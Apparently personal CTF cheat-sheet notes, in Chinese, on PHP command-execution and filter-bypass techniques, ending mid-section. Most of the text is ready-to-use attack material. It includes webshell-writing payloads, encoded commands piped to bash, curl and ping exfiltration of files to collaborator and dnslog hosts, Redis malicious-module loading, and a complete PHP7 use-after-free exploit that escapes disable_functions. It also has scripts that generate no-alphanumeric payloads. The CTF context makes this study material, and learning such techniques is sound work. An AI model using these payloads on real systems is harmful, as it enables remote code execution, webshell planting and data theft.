echo json_encode(scandir("/")); 		#json_encode() 函数将数组转换为 JSON 格式的字符串
print(implode('---',scandir("/")));

passthru("tac%20fla*");
print(`ls`);	//printf();print_r();
print_r(scandir("/"));
var_dump(scandir('/'));
var_dump(file_get_contents($_POST['a']));
var_export(scandir('/'));
var_export(glob('../../..'.'/*'));
print_r(scandir(dirname('FILE')));
highlight_file("flag.php");	//文件名必须全名
show_source('flag.php');
readgzfile("/flag.txt");
var_export(get_defined_vars())

###highlight_file+base64
highlight_file(base64_decode("ZmxhZy5waHA="));	//flag.php

##原生类
var_dump((new SplFileObject("/flag.txt"))->fpassthru());
var_dump((new SplFileObject("/flag.txt"))->fread(100));

##带参数输入
eval($_GET[1]);&1=system("tac%20flag.php");

##拼接
$a=sys;$b=tem;$d=$a.$b;$d("tac fl*");
(sy.(st).em)('cat f*');

##内联注释绕过
(sy./\*caixukun\*/(st)/\*caixukun\*/.em)/\*caixukun\*/(wh./\*caixukun\*/(oa)/\*caixukun\*/.mi);

## ``、$()
`cp fl*ag.p*hp 1.txt | cat 1.txt`
;cat `ls`
$(ls)

##?>闭合
?code=?><?=  `l\s`?> 
?code=?><?=  `nl /fffffffffflagafag`?>
?><?= phpinfo(); ?>

##file_put_content
file_put_contents("alb34t.php",'<?php%20eval($_POST["cmd"]);?>');//访问alb34t.php，然后就可以连马
file_put_contents('2.php','<?php eval($_POST[1]);?>');
file_put_contents('1.php',"<?php print_r(ini_get('open_basedir').'<br>'); mkdir('test'); chdir('test'); ini_set('open_basedir','…'); chdir('…'); chdir('…'); chdir('…'); ini_set('open_basedir','/'); echo file_get_contents('/flag'); print(1);?> ");

##cp、mv（无回显RCE）
echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;
ls / | tee 1.txt
cat /flag | tee 2.txt
eval(print`c\at /flag`;)
`c''p /[^x][^x][^x]g 3.txt`	#cp /flag 3.txt

##无参
show_source(next(array_reverse(scandir(pos(localeconv())))));
?code=eval(end(current(get_defined_vars())));&b=phpinfo();
system(current(getallheaders())); 	//用bs传参
readfile(array_rand(array_flip(scandir(pos(localeconv())))));//随机读取文件内容
show_source(next(array_reverse(scandir(current(localeconv())))));
show_source(next(array_reverse(scandir(next(each(str_split(spl_autoload_extensions())))))));

##glob
$f=glob("f*");show_source($f[0]);

##include
require
include($_GET[1]);&1=php://filter/read=convert.base64-encode/resource=flag.php
### ( ) ; 被过滤
include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
include%0A$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
include"$_GET[a]"?>&a=/var/log/nginx/access.log

##var_dump
eval(var_dump(scandir('/'););		#读取根目录
eval(var_dump(file_get_contents($_POST['a'])););&a=/flag		#读flag

##touch
touch f;touch l;touch a;touch g;dir -t>b.sh;bash b.sh
```

  

```bash
##ls替代
dir

##cat替代
nl
fmt
tac			//与cat相反，按行反向输出
more		//按页显示，用于文件内容较多且不能滚动屏幕时查看文件
strings
paste
rev
sort		//排序文件
head		//查看文件首几行
tail		//查看文件末几行
vim
vi
od			//以二进制方式读文件，od -A d -c /flag转可读字符
xxd 		//以二进制方式读文件，同时有可读字符显示
uniq		//报告或删除文件的重复行
less		//与more类似
file -f	flag.php	//报错文件内容
php /flag
sh /flag.php
curl file:///flag.php
sed -n "p" /flag.php
bzless /flag.php
bzmore /flag.php

###通过内置bash命令构造命令
# PATH一般=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# pwd=/var/www/html
# USER=www-data
# ${#RANDOM} 5或4
# ${#SHLVL}  1
# 先<A;在然后的$?就是1
# ${#} = ${Z}			 0
# PHP_VERSION 版本号
# ${?}=0
# ${#?}=1	($?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误)
# ${#IFS}=3
# ${PWD:${#}:${SHLVL}} = ${PWD:${#}:${##}} = {${PWD}:0:1} = /
# HOME的第一位肯定是/
# ${PWD:${SHLVL}:${#SHLVL}} = ${PWD:2:1} = a
# ${PWD:~${SHLVL}:${#SHLVL}} = ${PWD:-2:1} = t
# ${PWD:~A} = 取最后一位 = l
${PATH:14:1}${PATH:5:1}						#nl
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
${PATH:~A}${PATH:${#TERM}:${SHLVL:~A}} ????.???
${PATH:~0}${PWD:~0}								#nl,	linux中可以用~获取变量的最后几位
${PATH:~A}${PWD:~A}								#nl		字母与0作用一样
${PATH:~A}${PWD:~A}$IFS????.???	#nl flag.php
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???
                                                                    #/???/??t ????.???
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
                                                                    #/???/?at ????.???
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???					#/???/?a? ????.???
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???		#/???/r?? ????.???
${PWD::${##}}???${PWD::${##}}??${PWD:${##}:${##}} ????.???			#/???/??v ????.???
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???		#/???/?????4 ????.???	random需要多发几次包
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???					#/???/?????4 ????.??? random需要多发几次包

##传参、
$_GET[1]
$_POST[2]
### [ ]被过滤
$_GET{a} = $_GET[a]

##模糊匹配
?
*
[^x]
[a-z]
f[k-m]ag.php
f?ag.php
cat /f[a-z]{3}
[%00-%ff]

##grep
grep -r fl .
grep f* /fl*		#grep 文件内容 文件名
cat `find / | grep "fl*g"`
cat `ls | grep fla`
tac f*|grep \{
  
##路径
/bin/c??${IFS}f???????
/bin/rev
/bin/base64
/???/????64 ????.???
/usr/bin/bzip2 flag.php	#把flag.php给压缩，然后访问flag.php.bz2

## ' " /绕过
c\at /flag
l\s /
\system
ca""t /flag
l's' /
c''at /f''lag
ca``t<fl``ag

## $被过滤
变量$a代替$

##变量拼接
b=ag;cat /fl$b

##chr+.
某些过滤字符 可用chr进行绕过:
? num=2;var_dump(scandir(chr(47)))  //chr(47)='/'
? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //用`.`连接

##bash
bash<<<{more,fla[f-h]} //将<<<右边的内容作为文件内容给左边
```

### 空格绕过

```bash
##空格
<
<>
%20	//space
%09 //tab
$IFS$9
${IFS}
$IFS
{cat,/flag}
\t
```

### 编码绕过

```php
#编码绕过
##``、| bash、$()用于执行系统命令
echo Y2F0IC9mbGFn | base64 -d | bash
echo Y2F0IGZsYWcucGhw | base64 -d | sh
echo "Y2F0IC9mKg=="|base64 -d| bash	//cat /f*
`echo Y2F0IC9mbGFn | base64 -d`
$(echo Y2F0IC9mbGFn | base64 -d)
 
##hex
echo '636174202f666c6167' | xxd -r -p | bash	//cat /flag

##xxd
`xxd -r<<<0x63,0x61,0x74,0x20,0x66,0x6c,0x61,0x67,0x0a`
 
//shellcode编码

//八进制
$'\143\141\164' $'\146\154\141\147\56\160\150\160'	//cat flag.php
$'\142\141\163\145\66\64' $'\146\154\141\147\56\160\150\160' //base64 flag.php

\NNN 八进制数 NNN 所代表的 ASCII 码字符。
\xHH 十六进制 HH 对应的8位字符。HH 可以是一到两位。
\uHHHH 十六进制 HHHH 对应的 Unicode 字符。HHHH 一到四位。
\UHHHHHHHH十六进制 HHHHHHHH 对应的 Unicode 字符。HHHHHHHH 一到八位
```
```python
def string_to_hex_str(s):  
    # 编码为字节，然后格式化每个字节为十六进制字符串，并连接它们  
    return ''.join('\\x{:02x}'.format(b) for b in s.encode('utf-8'))  

s = "system"  
hex_encoded_str = string_to_hex_str(s)  
print(hex_encoded_str) # 输出: \x73\x79\x73\x74\x65\x6d
```

### 截断符号

```bash
#截断
;		##无论真假，都执行
&		##无论真假，都执行
|		##显示B执行结果
||	##A为假才执行B，否则只执行A
&&	##A为真才执行B，否则只执行A
```

### 无回显RCE

#### cp、mv、tee

```bash
#cp、mv、tee
echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;
ls / | tee 1
cat /flag | tee 2.txt
cat f* > 1
eval(print`c\at /flag`;)
`c''p /[^x][^x][^x]g 3.txt`	#cp /flag 3.txt
tee file1 file2 //复制文件
```

#### curl、ping带出

[ctfshow web133和其他命令执行的骚操作-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/109095382)

原理就是将flag.php上传到bp的Collaborator Client.获得flag

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1715655800590-6c1114aa-39f1-4a35-8e6b-40cc74c49bca.png)

```php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));

# payload 
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件 
?F=`$F`;+curl -X POST -F xx=@flag.php  8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net

https://requestbin.net/
?F=`$F`;+curl http://requestbin.net/r/1puo0jq1?p=`cat test2.php|grep flag`
```
```php
?F=`$F`;+ping `nl flag.php|awk 'NR==15'|tr -cd '[a-z]'/'[0-9]'`.i1k4phddlneygl58oqbjxv93full9a.oastify.com
?F=`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
```

#### dnslog带出

这个里面的写的挺全面的：[巧用DNSlog实现无回显注入@Afant1](https://www.cnblogs.com/afanti/p/8047530.html)

有兴趣可以自己搭建一个平台：[回显机制平台 dnslog 搭建@whatday](https://blog.csdn.net/whatday/article/details/107862031)

  

(不能发起http请求的情况下)

[DNSLog Platform](http://www.dnslog.cn/)

```plain
ping `cat flag| grep flag |base64`.xxx.xx
```

### 无参数RCE

利用getallheaders()、get\_defined\_vars()、session\_id等；

[无参数构造实现RCE](https://xz.aliyun.com/t/10212#toc-4)

```php
end() - 将内部指针指向数组中的最后一个元素，并输出。
next() - 将内部指针指向数组中的下一个元素，并输出。
prev() - 将内部指针指向数组中的上一个元素，并输出。
reset() - 将内部指针指向数组中的第一个元素，并输出。
each() - 返回当前元素的键名和键值，并将内部指针向前移动。
current() -输出数组中的当前元素的值。

scandir()  //函数返回指定目录中的文件和目录的数组。
localeconv()   //返回一包含本地数字及货币格式信息的数组。
current()     //返回数组中的单元，默认取第一个值。
pos是current的别名
getcwd()      //取得当前工作目录
dirname()     //函数返回路径中的目录部分。
array_flip()  //交换数组中的键和值，成功时返回交换后的数组
array_rand()  //从数组中随机取出一个或多个单元
array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
dirname(chdir(dirname()))配合切换文件路径
```
```php
?code=eval(end(current(get_defined_vars())));&b=phpinfo();
system(current(getallheaders())); 	//用bs传参
readfile(array_rand(array_flip(scandir(pos(localeconv())))));//随机读取文件内容
show_source(next(array_reverse(scandir(current(localeconv())))));
show_source(next(array_reverse(scandir(next(each(str_split(spl_autoload_extensions())))))));
```
```php
<?php
show_source(__FILE__);
    $code = $_GET['code'];
    if(strlen($code) > 80 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
        die(' Hello');
    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
        @eval($code);

    }
?>
      
  ?code=[~%8C%86%8C%8B%9A%92][!%FF]([~%9C%8A%8D%8D%9A%91%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));
  //system(current(getallheaders())); 	//取反用bs传参
  //[!%FF]是0的意思，因为前面是个数组，取数组里面的第0项才是木马
//()里面不能有调用函数以外的内容，但是取反得(~xxxxx)
//用GET传参[system][0] 就是相当于是['system'][0]，那就是'system'
//在PHP7的中 ('system')() 可以相当于 system()
```

### 无字母数字RCE

[无字母数字命令执行](https://blog.csdn.net/miuzzx/article/details/109143413?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166183464616782388057456%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166183464616782388057456&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-109143413-null-null.nonecase&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97&spm=1018.2226.3001.4450)

[无字母数字webshell之提高](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)​

#### 异或、取反、自增

#### 临时文件上传

```python
import requests

url ='https://b6e06847-f100-4176-8a02-da4badf2cf28.challenge.ctf.show/?c=. /???/????????[@-[]'

with open('1.txt','r') as file:
    files = {'file':file}
    res = requests.post(url = url ,files= files)
    if 'flag' in res.text:
        print(res.text)
--------------------------------------------
import requests
     
url = r'http://xxx.xxx/1.php?shell=?><?=. /???/????????[@-[]?>'
file = {
    'file': 'cat flag.php'
} 
response = requests.post(url, files=file)
print(response.text)

        
# 1.txt
#cat flag.php
# bzip2 -d flag.php.bz2 | cat flag.php
```

#### 异或+汉字作为变量名

$哈="\`{{{"^"?<>/";${$哈}\[哼\](${$哈}[嗯]);&哼=system&嗯=tac f\*

"\`{{{"^"?<>/"; //异或出来的结果是 \_GET

### Redis

  

利用Redis的主从复制漏洞进行RCE

  

> Redis的主从复制  
> Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为备份机(slave)，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。
> 
> Redis模块  
> 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码: [https://github.com/Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)
> 
> 利用原理  
> 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。很多主从复制导致任意命令执行都是通过Redis的未授权访问漏洞导致了横向移动攻击方式的发生。

  

目录下有一个`.swp`的 vim 泄露文件，进入查看发现了Redis服务的密码，数据库名、密码、用户名和主机名，很容易想到是**利用Redis提权**

  

```php
define("DB_HOST","localhost");
define("DB_USERNAME","root");
define("DB_PASSWOrd","");
define("DB_DATABASE","test");
define("REDIS_PASS","you_cannot_guess_it");//连接密码
```

  

下载并加载蚁剑Redis插件并连接Redis服务，向`/var/www/html`上传恶意`.so`文件

  

Redis终端中输入：

  

```plain
MODULE LOAD /var/www/html/exp.so
system.exec "cat /f*"
```

### 缓冲区

```php
ob_get_contents();	//返回输出缓冲区的内容
ob_clean();					//清空（擦掉）输出缓冲区
ob_end_clean();			//清空（擦除）缓冲区并关闭输出缓冲

#在劫持输出缓冲区之前就把缓冲区送出
include('/flag.txt');ob_flush();
ob_flush();
ob_end_flush();

#提前终止程序，即执行完代码直接退出
include('/flag.txt');exit();
exit();
die();
```

### open\_basedir绕过

[浅谈几种Bypass open\_basedir的方法 - Hookjoy - 博客园 (cnblogs.com)](https://www.cnblogs.com/hookjoy/p/12846164.html)

open\_basedir是php.ini的一个配置选项，用来规定用户可以访问的区域，也就是目录

```php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) {

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) {
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10;
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper->b)($cmd);
    exit();
}
ctfshow("cat /flag0.txt");//ob_end_flush();
?>
```

#### 通过sql的load\_file绕过

```php
通过连接默认数据库information_schema查询数据库名，发现确实存在名为ctftraining的数据库。
$dsn = "mysql:host=localhost;dbname=information_schema";
$db = new PDO($dsn, 'root', 'root');
$rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");
foreach($rs as $row){
        echo($row[0])."|"; 
}exit();

------------------------------------------------------------------------------------------------
try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
----------------------------------------------
$conn = mysqli_connect("127.0.0.1", "root", "root", "ctftraining");
$sql = "select load_file('/flag36.txt') as a";
$row = mysqli_query($conn, $sql);
while ($result = mysqli_fetch_array($row)) {
    echo $result['a'];
}
//exit();
```

### disable\_functions绕过

[php7-gc-bypass](https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass)

> **bypass disbable\_function**
> 
> **由于使用到了类，所以尝试一下php7（php7.0-7.3）中的因为垃圾回收机制(GC)造成的UAF漏洞**
> 
> **use after free,其内容如同其名称。在free后进行利用。UAF是堆结构漏洞的一种重要的利用方式**
> 
> **内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。  
> ****内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。  
> ****内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。**

蚁剑绕过

#### FFI

php7.4以上才有

[https://www.php.net/manual/zh/ffi.cdef.php](https://www.php.net/manual/zh/ffi.cdef.php)[https://www.php.cn/php-weizijiaocheng-415807.html](https://www.php.cn/php-weizijiaocheng-415807.html)

```php
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a = '/readflag > /var/www/html/1.txt';//没有回显的
$ffi->system($a);//通过$ffi去调用system函数
//exit();
```

  

#### 迭代器

```php
c=?><?php	
	error_reporting(0);
	echo getcwd().PHP_EOL;
	echo new FilesystemIterator('./').PHP_EOL;
	echo new FilesystemIterator(getcwd());
exit();
?>
```

#### glob

glob可以遍历目录，并且不受disable\_functions的限制。

```php
#eval($_GET[c])
?c=
?><?=$a = new DirectoryIterator("glob:///*");
foreach ($a as $f) {
    echo($f->__toString() . ' ');
}
exit(0);

-------------------------------------------------------------

$a = "glob:///*";
if ($b = opendir($a)) {
    while (($file = readdir($b)) !== false) {
        echo "filename:" . $file . "\n";
    }
    closedir($b);
}
//exit;
```

### ?>绕过

```php
eval("?>". $word);
?word=<script% language='php'>system($_GET[a]);</script>&a=nl /f*
```

### 1>/dev/null 2>&1绕过

> 1>/dev/null 2>&1的含义
> 
> 代表重定向到哪里，例如：echo “123” > /home/123.txt
> 
> 1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于"1>/dev/null"
> 
> 2 表示stderr标准错误
> 
> & 表示等同于的意思，2>&1，表示2的输出重定向等同于1

```php
system($c." >/dev/null 2>&1");

/*
1>/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。
2>&1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。
*/

我们要让命令回显，那么进行命令分隔即可
; //分号
| 
|| 
%26%26 //&&
%26 //&
%0a //换行
```

### return绕过

```php
eval("return 1;phpinfo();");
```

会发现是无法执行phpinfo()的，

但是php中有个有意思的地方，数字是可以和命令进行一些运算的，

例如 `1-phpinfo();`是可以执行phpinfo()命令的。

### exit、die绕过

[file\_put\_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-2)

```php
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);

##base64
file=php://filter/convert.base64-decode/resource=a.php
contents=ppPD9waHAgcGhwaW5mbygpO2V2YWwoJF9HRVRbJ2NtZCddKTs/Pg==

#<?php phpinfo();eval($_GET['cmd']);?>
#$contents加了pp，是因为base64在解码的时候是4个字节一组,<?phpdie();?>过滤无效字符后为phpdie，6个字符+2个字符(pp)
#file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行

##iconv
file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
contents=?<hp pvela$(P_SO[T]1;)>?
         ?<hp pvela$(G_TE'[mc'd)]?;>>
```

  

### 数学函数

[常用数学函数](http://www.w3school.com.cn/php/php_ref_math.asp )

```php
eval('echo '.$_GET['c'].';');c白名单为数学函数，过滤了空格、\t、\r、\n、单引号、双引号、`、[、]、0-9、a-z、A-Z、\x7f-\xff

?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{exp});&cos=system&exp=cat /f*
?c=2;${1}=base_convert(37907361743,10,36)(dechex(1598506324));$${1}{2}($${1}{3})&2=system&3=cat /f*
${1}不会被过滤，$1会被过滤
  
  $${1}{2}($${1}{3}) 
  $_GET{2}($_GET{3})
  
把 "hex2bin" 看成 36 进制，然后转换成 10 进制：
echo base_convert('hex2bin',36,10);   // 37907361743	//base_convert 可以返回包含 a-z 的字符串
echo base_convert(37907361743,10,36);    // hex2bin

echo bin2hex("_GET");      // 5f474554
echo hex2bin("5f474554");  // _GET

echo hexdec("5f474554");        // 1598506324，整型
echo dechex(1598506324);        // 5f474554，字符串
```

### | 或运算绕过

```php
import re
import urllib
from urllib import parse
hex_i = ""
hex_j = ""
pattern='/[0-9]|[a-z]|\^|\+|\~|\$|[|]|\{|\}|\&|\-/i'
str1=["system","lss"]
for p in range(2):
    t1 = ""
    t2 = ""
    for k in str1[p]:
        for i in range(256):
            for j in range(256):
                if re.search(pattern,chr(i)) :
                    break
                if re.search(pattern,chr(j)) :
                    continue
                if i < 16:
                    hex_i = "0" + hex(i)[2:]
                else:
                    hex_i=hex(i)[2:]
                if j < 16:
                    hex_j="0"+hex(j)[2:]
                else:
                    hex_j=hex(j)[2:]
                hex_i='%'+hex_i
                hex_j='%'+hex_j
                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))
                if(c ==k):
                    t1=t1+hex_i
                    t2=t2+hex_j
                    break
            else:
                continue
            break
    print("(\""+t1+"\"|\""+t2+"\")")
#("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13"|"%60%60")
#(system)(ls)
```

### 取反绕过

```python
echo $(())	#0
echo $((~$(())))   #-1

res = '$((~$(())'
for i in range(36):
    res  += '$((~$(())))'
res +='))'
print(res)

echo ${#} //0 
echo ${##} //1 
echo $((${##}+${##})) //2 
echo $(($((${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##})))) //36

    $(($((${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}+${##}))))

---------------------------------
data = "$((~$(("+"$((~$(())))"*37+"))))"
print(data)
```
```php
//取反传参
<?php
 
$a = "system";
$b = "cat /flag";
 
$c = urlencode(~$a);
$d = urlencode(~$b);
 
//输出得到取反传参内容
echo "?cmd=(~".$c.")(~".$d.");"
?>
(~%8C%86%8C%8B%9A%92)(~%93%8C); 	//(system)(ls);
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);	 //(system)(cat f*);
```
```python
exp = ""
def urlbm(s):
    ss = ""
    for each in s:
        ss += "%" + str(hex(255 - ord(each)))[2:]
    return f"[~{ss}][!%FF]("
while True:
    fun = input("Firebasky>: ").strip(")").split("(")
    exp = ''
    for each in fun[:-1]:
        exp += urlbm(each)
        print(exp)
    exp += ")" * (len(fun) - 1) + ";"
    print(exp)
```
```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','[','\^',']','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?>
```

### 异或绕过

  

```php
php5中的assert函数会将括号里面的字符串当作php代码来执行。因此我们可以构造出assert($_GET[6])

a:'%40'^'%21' ;s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'
G:'%3C'^'%7B';E:'%3E'^'%7B';T:'%0B'^'%5F';
//拼接起来
